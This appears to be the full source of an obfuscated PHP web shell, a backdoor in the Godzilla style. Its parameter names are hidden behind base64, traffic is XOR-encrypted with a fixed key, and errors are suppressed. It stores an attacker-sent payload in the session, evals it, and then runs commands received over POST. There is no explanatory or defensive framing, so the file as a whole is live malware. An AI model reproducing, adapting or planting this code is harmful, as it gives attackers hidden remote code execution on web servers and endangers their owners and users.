<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function xor_transform($input_data, $key_stream){
    for($i=0; $i<strlen($input_data); $i++) {
        $char_key = $key_stream[$i+1&15];
        $input_data[$i] = $input_data[$i]^$char_key;
    }
    return $input_data;
}
$auth_param = base64_decode('d29sZnNoZWxs');
$session_id = base64_decode('cGF5bG9hZA==');
$secret_key = '3c6e0b8a9c15224a';
if (isset($_POST[$auth_param])){
    $decoded_input = xor_transform(base64_decode($_POST[$auth_param]), $secret_key);
    if (isset($_SESSION[$session_id])){
        $stored_payload = xor_transform($_SESSION[$session_id], $secret_key);
        if (strpos($stored_payload, base64_decode('Z2V0QmFzaWNzSW5mbw==')) === false){
            $stored_payload = xor_transform($stored_payload, $secret_key);
        }
        eval($stored_payload);
        echo substr(md5($auth_param.$secret_key), 0, 16);
        echo base64_encode(xor_transform(@run($decoded_input), $secret_key));
        echo substr(md5($auth_param.$secret_key), 16);
    } else {
        if (strpos($decoded_input, base64_decode('Z2V0QmFzaWNzSW5mbw==')) !== false){
            $_SESSION[$session_id] = xor_transform($decoded_input, $secret_key);
        }
    }
}
